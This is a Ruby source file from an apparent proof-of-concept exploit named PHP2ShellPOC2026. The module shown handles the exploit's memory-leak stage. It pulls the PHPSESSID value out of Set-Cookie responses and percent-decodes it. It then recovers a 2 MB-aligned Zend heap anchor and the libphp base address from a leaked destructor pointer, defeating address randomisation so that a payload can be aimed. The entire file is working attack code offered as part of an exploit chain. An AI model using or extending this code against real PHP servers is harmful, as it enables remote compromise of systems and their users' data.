# frozen_string_literal: true

module PHP2ShellPOC2026
  module Poc
    # The exploit's leak channel is the PHPSESSID cookie. These helpers turn
    # the raw Set-Cookie value into the two addresses the payload needs:
    # a 2 MB-aligned Zend heap anchor and the libphp mapping base.
    module CookieMemory
      POINTER_MIN = 0x7F0000000000
      POINTER_MAX = 0x800000000000
      HEAP_MASK = 0xFFFFFFFFFFE00000
      PAGE_MASK = 0xFFF

      module_function

      def session_id(response)
        match = response.to_s.b.match(/Set-Cookie: PHPSESSID=([^\r\n]*?); path=\//n)
        return "".b unless match

        percent_decode(match[1])
      end

      def heap_anchor(raw)
        raw = raw.to_s.b
        return 0 if raw.bytesize < 1000

        counts = Hash.new(0)
        limit = raw.bytesize - 8
        (0..limit).each do |offset|
          value = raw.byteslice(offset, 8).unpack1("Q<")
          next unless value && value >= POINTER_MIN && value < POINTER_MAX

          counts[value & HEAP_MASK] += 1
        end
        return 0 if counts.empty?

        anchor, count = counts.max_by { |_, seen| seen }
        count >= 8 ? anchor : 0
      end

      def library_anchor(raw, destructor_offset)
        raw = raw.to_s.b
        return 0 if raw.bytesize < 16

        address = raw.byteslice(8, 8).unpack1("Q<")
        return 0 unless address && address >= POINTER_MIN && address < POINTER_MAX
        return 0 unless (address & PAGE_MASK) == (destructor_offset & PAGE_MASK)

        base = address - destructor_offset
        (base & PAGE_MASK).zero? ? base : 0
      end

      def percent_decode(value)
        value.to_s.b.gsub(/%([0-9A-Fa-f]{2})/n) { [Regexp.last_match(1).to_i(16)].pack("C") }.b
      end
    end
  end
end
